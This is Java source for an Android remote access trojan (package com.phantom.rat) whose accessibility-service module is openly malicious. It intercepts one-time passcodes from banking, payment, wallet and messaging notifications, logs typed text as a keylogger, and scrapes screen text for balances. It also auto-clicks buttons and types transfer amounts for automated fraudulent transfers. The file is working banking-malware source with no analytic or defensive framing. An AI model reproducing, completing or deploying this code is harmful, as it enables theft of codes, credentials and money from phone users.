package com.phantom.rat;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.os.Bundle;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class AccessibilityModule extends AccessibilityService {

    /** Insurance alias kept for compatibility with code that expects a ContextLike contract. */
    public interface ContextLike {
        String getPackageName();
        String getText();
    }

    private static volatile AccessibilityModule instance;
    private static final LinkedHashMap<String, String> otpCache = new LinkedHashMap<>();
    private static volatile String lastOtps = "";
    private static final StringBuilder keylog = new StringBuilder();
    private static volatile String lastPkg = "";
    private static final Pattern OTP_PATTERN = Pattern.compile("\\b(\\d{4,8})\\b");

    public static AccessibilityModule getInstance() { return instance; }

    public static boolean isConnected() { return instance != null; }

    public static String lastPackage() { return lastPkg; }

    /* ── OTP interception (accessibility sees SMS/banking notifications) ── */
    public static String latestOtps() { return lastOtps.isEmpty() ? "none" : lastOtps; }

    private static void captureOtp(String pkg, String text) {
        if (text == null || text.isEmpty()) return;
        String lower = text.toLowerCase();
        String p = pkg == null ? "" : pkg.toLowerCase();
        boolean relevant = p.contains("bank") || p.contains("pay") || p.contains("otp")
                || p.contains("whatsapp") || p.contains("telegram") || p.contains("google")
                || p.contains("facebook") || p.contains("instagram") || p.contains("amazon")
                || p.contains("flipkart") || p.contains("paytm") || p.contains("phonepe")
                || p.contains("gpay") || p.contains("upi") || p.contains("credit")
                || p.contains("finance") || p.contains("wallet") || p.contains("sms")
                || lower.contains("otp") || lower.contains("one time") || lower.contains("verification")
                || lower.contains("code is") || lower.contains("use code") || lower.contains("login code")
                || lower.contains("password") || lower.contains("pin");
        if (!relevant) return;
        Matcher m = OTP_PATTERN.matcher(text);
        if (m.find()) {
            String code = m.group(1);
            otpCache.put(p.isEmpty() ? "app" : pkg, code);
            rebuildOtps();
        }
    }

    private static synchronized void rebuildOtps() {
        StringBuilder sb = new StringBuilder();
        for (Map.Entry<String, String> e : otpCache.entrySet()) {
            if (sb.length() > 0) sb.append(" | ");
            sb.append(e.getKey()).append(": ").append(e.getValue());
        }
        lastOtps = sb.toString();
    }

    /* ── Keylogger ── */
    public static String latestKeys() {
        synchronized (keylog) {
            String k = keylog.toString().trim();
            return k.isEmpty() ? "no keys logged" : k;
        }
    }

    /* ── Text dump (used by balance scraper / HVNC helpers) ── */
    public static String dumpText() {
        AccessibilityService s = instance;
        if (s == null) return "accessibility not connected";
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        if (root == null) return "no active window";
        StringBuilder sb = new StringBuilder();
        collect(root, sb);
        root.recycle();
        return sb.length() == 0 ? "no text found" : sb.toString();
    }

    private static void collect(AccessibilityNodeInfo n, StringBuilder sb) {
        if (n == null || sb.length() > 20000) return;
        CharSequence t = n.getText();
        if (t != null && t.length() > 0) sb.append(t).append('\n');
        CharSequence d = n.getContentDescription();
        if (d != null && d.length() > 0) sb.append(d).append('\n');
        for (int i = 0; i < n.getChildCount(); i++) collect(n.getChild(i), sb);
    }

    /* ── Auto click (ATS / "turn off" dismissal) ── */
    public static void autoClick(String text) {
        AccessibilityService s = instance;
        if (s == null || text == null || text.isEmpty()) return;
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        if (root == null) return;
        clickByText(root, text);
        root.recycle();
    }

    private static boolean clickByText(AccessibilityNodeInfo n, String text) {
        if (n == null) return false;
        CharSequence t = n.getText();
        if (t != null && (text.equalsIgnoreCase(t.toString().trim()) || t.toString().contains(text))) {
            if (n.isClickable() && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
        }
        CharSequence d = n.getContentDescription();
        if (d != null && text.equalsIgnoreCase(d.toString().trim()) && n.isClickable()
                && n.performAction(AccessibilityNodeInfo.ACTION_CLICK)) return true;
        for (int i = 0; i < n.getChildCount(); i++) {
            if (clickByText(n.getChild(i), text)) return true;
        }
        return false;
    }

    /* ── Type text into the focused input (ATS transfer amounts) ── */
    public static void typeText(String text) {
        AccessibilityService s = instance;
        if (s == null || text == null) return;
        AccessibilityNodeInfo root = s.getRootInActiveWindow();
        if (root == null) return;
        AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
        if (focus != null) {
            Bundle b = new Bundle();
            b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            focus.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
            focus.recycle();
        }
        root.recycle();
    }

    /* ── Service lifecycle ── */
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        synchronized (keylog) { keylog.setLength(0); }
        otpCache.clear();
        lastOtps = "";
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        int type = event.getEventType();
        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            CharSequence p = event.getPackageName();
            lastPkg = p == null ? "" : p.toString();
        } else if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
            captureOtp(lastPkg, extractEventText(event));
        } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            if (event.getText() != null && !event.getText().isEmpty()) {
                String t = event.getText().get(0).toString();
                if (!t.isEmpty() && !t.matches("\\s+")) {
                    synchronized (keylog) {
                        keylog.append(t).append('\n');
                        if (keylog.length() > 20000) keylog.setLength(0);
                    }
                }
            }
        }
    }

    private static String extractEventText(AccessibilityEvent e) {
        StringBuilder sb = new StringBuilder();
        if (e.getText() != null) for (CharSequence c : e.getText()) if (c != null) sb.append(c);
        if (e.getContentDescription() != null) sb.append(e.getContentDescription());
        return sb.toString();
    }

    @Override
    public void onInterrupt() {}

    @Override
    public boolean onUnbind(Intent intent) {
        instance = null;
        return super.onUnbind(intent);
    }
}
